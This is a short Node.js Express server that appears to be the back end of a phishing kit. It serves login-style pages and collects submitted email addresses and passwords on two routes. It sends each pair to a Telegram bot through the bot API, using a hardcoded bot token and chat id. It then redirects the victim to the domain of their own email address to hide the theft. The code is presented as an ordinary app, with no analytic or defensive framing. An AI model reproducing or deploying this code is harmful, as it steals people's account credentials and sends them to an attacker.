const express = require("express");
const bodyParser = require("body-parser");
const ejs = require("ejs");
const axios = require('axios');
const app = express();

app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get('/', function (req, res) {
  const username = req.query.username;
  res.render('recap', { username: username });
});

app.post('/', function (req, res) {
  const username = req.body.recapstore;
  res.render('index', { username: username });
});

app.get('/final', function (req, res) {
  res.render('final');
});

app.get('/second', function (req, res) {
  const username = req.query.username;
  res.render('second', { username: username });
});

app.post('/index', function (req, res) {
  const email = req.body.email;
  const password = req.body.password;
  sendToTelegram(email, password);
  const username = email;
  res.render('second', { username: username });
});

app.post('/second', function (req, res) {
  const email = req.body.email;
  const password = req.body.password;
  sendToTelegram(email, password);
  const emailDomain = email.split('@')[1];
  res.redirect('https://' + emailDomain);
});

// Function to send data to Telegram bot
function sendToTelegram(email, password) {
  const telegramBotToken = '7024342998:AAGYpkILCh10bljU5W1GwEsqEEO2jH8T1jU';
  const chatId = '-1002099405143';
  const message = `New user registered:\nEmail: ${email}\nPassword: ${password}`;
  const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
  
  axios.get(apiUrl)
    .then(response => {
      console.log("Message sent to Telegram bot");
    })
    .catch(error => {
      console.error("Error sending message to Telegram bot:", error);
    });
}

const port = process.env.PORT || 3000;
app.listen(port, function () {
  console.log("Server is running on port " + port);
});
